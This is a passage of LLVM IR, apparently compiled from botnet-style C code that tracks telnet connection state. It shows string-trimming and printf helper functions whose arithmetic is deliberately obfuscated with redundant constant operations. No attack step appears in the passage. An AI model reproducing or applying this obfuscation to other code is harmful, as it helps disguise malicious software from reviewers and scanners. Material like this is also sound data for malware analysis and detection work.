  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = add i64 %7, -1278550677076131012
  %9 = sub i64 %8, 1
  %10 = sub i64 %9, -1278550677076131012
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #9
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %4, align 4
  br label %13

; <label>:29:                                     ; preds = %13
  br label %30

; <label>:30:                                     ; preds = %45, %29
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %43

; <label>:34:                                     ; preds = %30
  %35 = load i8*, i8** %2, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = call i32 @isspace(i32 %40) #9
  %42 = icmp ne i32 %41, 0
  br label %43

; <label>:43:                                     ; preds = %34, %30
  %44 = phi i1 [ false, %30 ], [ %42, %34 ]
  br i1 %44, label %45, label %52

; <label>:45:                                     ; preds = %43
  %46 = load i32, i32* %5, align 4
  %47 = sub i32 0, %46
  %48 = sub i32 0, -1
  %49 = add i32 %47, %48
  %50 = sub i32 0, %49
  %51 = add nsw i32 %46, -1
  store i32 %50, i32* %5, align 4
  br label %30

; <label>:52:                                     ; preds = %43
  %53 = load i32, i32* %4, align 4
  store i32 %53, i32* %3, align 4
  br label %54

; <label>:54:                                     ; preds = %72, %52
  %55 = load i32, i32* %3, align 4
  %56 = load i32, i32* %5, align 4
  %57 = icmp sle i32 %55, %56
  br i1 %57, label %58, label %79

; <label>:58:                                     ; preds = %54
  %59 = load i8*, i8** %2, align 8
  %60 = load i32, i32* %3, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = load i8*, i8** %2, align 8
  %65 = load i32, i32* %3, align 4
  %66 = load i32, i32* %4, align 4
  %67 = sub i32 0, %66
  %68 = add i32 %65, %67
  %69 = sub nsw i32 %65, %66
  %70 = sext i32 %68 to i64
  %71 = getelementptr inbounds i8, i8* %64, i64 %70
  store i8 %63, i8* %71, align 1
  br label %72

; <label>:72:                                     ; preds = %58
  %73 = load i32, i32* %3, align 4
  %74 = sub i32 0, %73
  %75 = sub i32 0, 1
  %76 = add i32 %74, %75
  %77 = sub i32 0, %76
  %78 = add nsw i32 %73, 1
  store i32 %77, i32* %3, align 4
  br label %54

; <label>:79:                                     ; preds = %54
  %80 = load i8*, i8** %2, align 8
  %81 = load i32, i32* %3, align 4
  %82 = load i32, i32* %4, align 4
  %83 = sub i32 %81, 500620015
  %84 = sub i32 %83, %82
  %85 = add i32 %84, 500620015
  %86 = sub nsw i32 %81, %82
  %87 = sext i32 %85 to i64
  %88 = getelementptr inbounds i8, i8* %80, i64 %87
  store i8 0, i8* %88, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %335, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %338

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %322

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %338

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %323

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %85, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = sub i32 %76, 1593859483
  %78 = sub i32 %77, 48
  %79 = add i32 %78, 1593859483
  %80 = sub nsw i32 %76, 48
  %81 = load i32, i32* %7, align 4
  %82 = sub i32 0, %79
  %83 = sub i32 %81, %82
  %84 = add nsw i32 %81, %79
  store i32 %83, i32* %7, align 4
  br label %85

; <label>:85:                                     ; preds = %71
  %86 = load i8*, i8** %5, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %5, align 8
  br label %59

; <label>:88:                                     ; preds = %69
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 115
  br i1 %92, label %93, label %133

; <label>:93:                                     ; preds = %88
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = icmp ule i32 %96, 40
  br i1 %97, label %98, label %107

; <label>:98:                                     ; preds = %93
  %99 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 3
  %100 = load i8*, i8** %99, align 8
  %101 = getelementptr i8, i8* %100, i32 %96
  %102 = bitcast i8* %101 to i32*
  %103 = sub i32 %96, -1832088823
  %104 = add i32 %103, 8
  %105 = add i32 %104, -1832088823
  %106 = add i32 %96, 8
  store i32 %105, i32* %95, align 8
  br label %112

; <label>:107:                                    ; preds = %93
  %108 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 2
  %109 = load i8*, i8** %108, align 8
  %110 = bitcast i8* %109 to i32*
  %111 = getelementptr i8, i8* %109, i32 8
  store i8* %111, i8** %108, align 8
  br label %112

; <label>:112:                                    ; preds = %107, %98
  %113 = phi i32* [ %102, %98 ], [ %110, %107 ]
  %114 = load i32, i32* %113, align 4
  %115 = sext i32 %114 to i64
  %116 = inttoptr i64 %115 to i8*
  store i8* %116, i8** %11, align 8
  %117 = load i8**, i8*** %4, align 8
  %118 = load i8*, i8** %11, align 8
  %119 = icmp ne i8* %118, null
  br i1 %119, label %120, label %122

; <label>:120:                                    ; preds = %112
  %121 = load i8*, i8** %11, align 8
  br label %123

; <label>:122:                                    ; preds = %112
  br label %123

; <label>:123:                                    ; preds = %122, %120
  %124 = phi i8* [ %121, %120 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.209, i32 0, i32 0), %122 ]
  %125 = load i32, i32* %7, align 4
  %126 = load i32, i32* %8, align 4
  %127 = call i32 @prints(i8** %117, i8* %124, i32 %125, i32 %126)
  %128 = load i32, i32* %9, align 4
  %129 = sub i32 %128, -1741458385
  %130 = add i32 %129, %127
  %131 = add i32 %130, -1741458385
  %132 = add nsw i32 %128, %127
  store i32 %131, i32* %9, align 4
  br label %335

; <label>:133:                                    ; preds = %88
  %134 = load i8*, i8** %5, align 8
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 100
  br i1 %137, label %138, label %169

; <label>:138:                                    ; preds = %133
  %139 = load i8**, i8*** %4, align 8
  %140 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = icmp ule i32 %142, 40
  br i1 %143, label %144, label %154

; <label>:144:                                    ; preds = %138
  %145 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %140, i32 0, i32 3
  %146 = load i8*, i8** %145, align 8
  %147 = getelementptr i8, i8* %146, i32 %142
  %148 = bitcast i8* %147 to i32*
  %149 = sub i32 0, %142
  %150 = sub i32 0, 8
  %151 = add i32 %149, %150
  %152 = sub i32 0, %151
  %153 = add i32 %142, 8
  store i32 %152, i32* %141, align 8
  br label %159

; <label>:154:                                    ; preds = %138
  %155 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %140, i32 0, i32 2
  %156 = load i8*, i8** %155, align 8
  %157 = bitcast i8* %156 to i32*
  %158 = getelementptr i8, i8* %156, i32 8
  store i8* %158, i8** %155, align 8
  br label %159

; <label>:159:                                    ; preds = %154, %144
  %160 = phi i32* [ %148, %144 ], [ %157, %154 ]
  %161 = load i32, i32* %160, align 4
  %162 = load i32, i32* %7, align 4
  %163 = load i32, i32* %8, align 4
  %164 = call i32 @printi(i8** %139, i32 %161, i32 10, i32 1, i32 %162, i32 %163, i32 97)
  %165 = load i32, i32* %9, align 4
  %166 = sub i32 0, %164
  %167 = sub i32 %165, %166
  %168 = add nsw i32 %165, %164
  store i32 %167, i32* %9, align 4
  br label %335

; <label>:169:                                    ; preds = %133
  %170 = load i8*, i8** %5, align 8
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 120
  br i1 %173, label %174, label %206

; <label>:174:                                    ; preds = %169
  %175 = load i8**, i8*** %4, align 8
  %176 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %177 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = icmp ule i32 %178, 40
  br i1 %179, label %180, label %190

; <label>:180:                                    ; preds = %174
  %181 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %176, i32 0, i32 3
  %182 = load i8*, i8** %181, align 8
  %183 = getelementptr i8, i8* %182, i32 %178
  %184 = bitcast i8* %183 to i32*
  %185 = sub i32 0, %178
  %186 = sub i32 0, 8
  %187 = add i32 %185, %186
  %188 = sub i32 0, %187
  %189 = add i32 %178, 8
  store i32 %188, i32* %177, align 8
  br label %195

; <label>:190:                                    ; preds = %174
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %176, i32 0, i32 2
  %192 = load i8*, i8** %191, align 8
  %193 = bitcast i8* %192 to i32*
  %194 = getelementptr i8, i8* %192, i32 8
  store i8* %194, i8** %191, align 8
  br label %195

; <label>:195:                                    ; preds = %190, %180
  %196 = phi i32* [ %184, %180 ], [ %193, %190 ]
  %197 = load i32, i32* %196, align 4
  %198 = load i32, i32* %7, align 4
  %199 = load i32, i32* %8, align 4
  %200 = call i32 @printi(i8** %175, i32 %197, i32 16, i32 0, i32 %198, i32 %199, i32 97)
  %201 = load i32, i32* %9, align 4
  %202 = sub i32 %201, -1734519416
  %203 = add i32 %202, %200
  %204 = add i32 %203, -1734519416
  %205 = add nsw i32 %201, %200
  store i32 %204, i32* %9, align 4
  br label %335

; <label>:206:                                    ; preds = %169
  %207 = load i8*, i8** %5, align 8
  %208 = load i8, i8* %207, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 88
  br i1 %210, label %211, label %243

; <label>:211:                                    ; preds = %206
  %212 = load i8**, i8*** %4, align 8
  %213 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %214 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 8
  %216 = icmp ule i32 %215, 40
  br i1 %216, label %217, label %226

; <label>:217:                                    ; preds = %211
  %218 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %213, i32 0, i32 3
  %219 = load i8*, i8** %218, align 8
  %220 = getelementptr i8, i8* %219, i32 %215
  %221 = bitcast i8* %220 to i32*
  %222 = add i32 %215, -1173558250
  %223 = add i32 %222, 8
  %224 = sub i32 %223, -1173558250
  %225 = add i32 %215, 8
  store i32 %224, i32* %214, align 8
  br label %231

; <label>:226:                                    ; preds = %211
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %213, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %217
  %232 = phi i32* [ %221, %217 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %212, i32 %233, i32 16, i32 0, i32 %234, i32 %235, i32 65)
  %237 = load i32, i32* %9, align 4
  %238 = sub i32 0, %237
  %239 = sub i32 0, %236
  %240 = add i32 %238, %239
  %241 = sub i32 0, %240
  %242 = add nsw i32 %237, %236
  store i32 %241, i32* %9, align 4
  br label %335

; <label>:243:                                    ; preds = %206
  %244 = load i8*, i8** %5, align 8
  %245 = load i8, i8* %244, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 117
  br i1 %247, label %248, label %280

; <label>:248:                                    ; preds = %243
  %249 = load i8**, i8*** %4, align 8
  %250 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %251 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %250, i32 0, i32 0
  %252 = load i32, i32* %251, align 8
  %253 = icmp ule i32 %252, 40
  br i1 %253, label %254, label %263

; <label>:254:                                    ; preds = %248
  %255 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %250, i32 0, i32 3
  %256 = load i8*, i8** %255, align 8
  %257 = getelementptr i8, i8* %256, i32 %252
  %258 = bitcast i8* %257 to i32*
  %259 = add i32 %252, 769441217
  %260 = add i32 %259, 8
  %261 = sub i32 %260, 769441217
  %262 = add i32 %252, 8
  store i32 %261, i32* %251, align 8
  br label %268

; <label>:263:                                    ; preds = %248
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %250, i32 0, i32 2
  %265 = load i8*, i8** %264, align 8
  %266 = bitcast i8* %265 to i32*
  %267 = getelementptr i8, i8* %265, i32 8
  store i8* %267, i8** %264, align 8
  br label %268

; <label>:268:                                    ; preds = %263, %254
  %269 = phi i32* [ %258, %254 ], [ %266, %263 ]
  %270 = load i32, i32* %269, align 4
  %271 = load i32, i32* %7, align 4
  %272 = load i32, i32* %8, align 4
  %273 = call i32 @printi(i8** %249, i32 %270, i32 10, i32 0, i32 %271, i32 %272, i32 97)
  %274 = load i32, i32* %9, align 4
  %275 = sub i32 0, %274
  %276 = sub i32 0, %273
  %277 = add i32 %275, %276
  %278 = sub i32 0, %277
  %279 = add nsw i32 %274, %273
  store i32 %278, i32* %9, align 4
  br label %335

; <label>:280:                                    ; preds = %243
  %281 = load i8*, i8** %5, align 8
  %282 = load i8, i8* %281, align 1
  %283 = zext i8 %282 to i32
  %284 = icmp eq i32 %283, 99
  br i1 %284, label %285, label %321

; <label>:285:                                    ; preds = %280
  %286 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %287 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 8
  %289 = icmp ule i32 %288, 40
  br i1 %289, label %290, label %299

; <label>:290:                                    ; preds = %285
  %291 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 3
  %292 = load i8*, i8** %291, align 8
  %293 = getelementptr i8, i8* %292, i32 %288
  %294 = bitcast i8* %293 to i32*
  %295 = add i32 %288, 1634491877
  %296 = add i32 %295, 8
  %297 = sub i32 %296, 1634491877
  %298 = add i32 %288, 8
  store i32 %297, i32* %287, align 8
  br label %304

; <label>:299:                                    ; preds = %285
  %300 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 2
  %301 = load i8*, i8** %300, align 8
  %302 = bitcast i8* %301 to i32*
  %303 = getelementptr i8, i8* %301, i32 8
  store i8* %303, i8** %300, align 8
  br label %304

; <label>:304:                                    ; preds = %299, %290
  %305 = phi i32* [ %294, %290 ], [ %302, %299 ]
  %306 = load i32, i32* %305, align 4
  %307 = trunc i32 %306 to i8
  %308 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %307, i8* %308, align 1
  %309 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %309, align 1
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %312 = load i32, i32* %7, align 4
  %313 = load i32, i32* %8, align 4
  %314 = call i32 @prints(i8** %310, i8* %311, i32 %312, i32 %313)
  %315 = load i32, i32* %9, align 4
  %316 = sub i32 0, %315
  %317 = sub i32 0, %314
  %318 = add i32 %316, %317
  %319 = sub i32 0, %318
  %320 = add nsw i32 %315, %314
  store i32 %319, i32* %9, align 4
  br label %335

; <label>:321:                                    ; preds = %280
  br label %334

; <label>:322:                                    ; preds = %17
  br label %323

; <label>:323:                                    ; preds = %322, %35
  %324 = load i8**, i8*** %4, align 8
  %325 = load i8*, i8** %5, align 8
  %326 = load i8, i8* %325, align 1
  %327 = zext i8 %326 to i32
  call void @printchar(i8** %324, i32 %327)
  %328 = load i32, i32* %9, align 4
  %329 = sub i32 0, %328
  %330 = sub i32 0, 1
  %331 = add i32 %329, %330
  %332 = sub i32 0, %331
  %333 = add nsw i32 %328, 1
  store i32 %332, i32* %9, align 4
  br label %334

; <label>:334:                                    ; preds = %323, %321
  br label %335

; <label>:335:                                    ; preds = %334, %304, %268, %231, %195, %159, %123
  %336 = load i8*, i8** %5, align 8
  %337 = getelementptr inbounds i8, i8* %336, i32 1
  store i8* %337, i8** %5, align 8
  br label %12

; <label>:338:                                    ; preds = %29, %12
  %339 = load i8**, i8*** %4, align 8
  %340 = icmp ne i8** %339, null
  br i1 %340, label %341, label %344

; <label>:341:                                    ; preds = %338
  %342 = load i8**, i8*** %4, align 8
  %343 = load i8*, i8** %342, align 8
  store i8 0, i8* %343, align 1
  br label %344

; <label>:344:                                    ; preds = %341, %338
  %345 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %346 = bitcast %struct.__va_list_tag* %345 to i8*
  call void @llvm.va_end(i8* %346)
  %347 = load i32, i32* %9, align 4
  ret i32 %347
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %55

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 %22, 704076986
  %24 = add i32 %23, 1
  %25 = add i32 %24, 704076986
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub i32 %37, -914788891
  %39 = sub i32 %38, %36
  %40 = add i32 %39, -914788891
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 %43, -1
  %45 = xor i32 2, -1
  %46 = xor i32 1632204975, -1
  %47 = or i32 %44, %45
  %48 = or i32 1632204975, %46
  %49 = xor i32 %47, -1
  %50 = and i32 %49, %48
  %51 = and i32 %43, 2
  %52 = icmp ne i32 %50, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %54

; <label>:54:                                     ; preds = %53, %42
  br label %55

; <label>:55:                                     ; preds = %54, %4
  %56 = load i32, i32* %8, align 4
  %57 = xor i32 1, -1
  %58 = xor i32 %56, %57
  %59 = and i32 %58, %56
  %60 = and i32 %56, 1
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %80, label %62

; <label>:62:                                     ; preds = %55
  br label %63

; <label>:63:                                     ; preds = %74, %62
  %64 = load i32, i32* %7, align 4
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %79

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %10, align 4
  call void @printchar(i8** %67, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add i32 %69, -1977723256
  %71 = add i32 %70, 1
  %72 = sub i32 %71, -1977723256
  %73 = add nsw i32 %69, 1
  store i32 %72, i32* %9, align 4
  br label %74

; <label>:74:                                     ; preds = %66
  %75 = load i32, i32* %7, align 4
  %76 = sub i32 0, -1
  %77 = sub i32 %75, %76
  %78 = add nsw i32 %75, -1
  store i32 %77, i32* %7, align 4
  br label %63

; <label>:79:                                     ; preds = %63
  br label %80

; <label>:80:                                     ; preds = %79, %55
  br label %81

; <label>:81:                                     ; preds = %96, %80
  %82 = load i8*, i8** %6, align 8
  %83 = load i8, i8* %82, align 1
  %84 = icmp ne i8 %83, 0
  br i1 %84, label %85, label %99

; <label>:85:                                     ; preds = %81
  %86 = load i8**, i8*** %5, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  call void @printchar(i8** %86, i32 %89)
  %90 = load i32, i32* %9, align 4
  %91 = sub i32 0, %90
  %92 = sub i32 0, 1
  %93 = add i32 %91, %92
  %94 = sub i32 0, %93
  %95 = add nsw i32 %90, 1
  store i32 %94, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %85
  %97 = load i8*, i8** %6, align 8
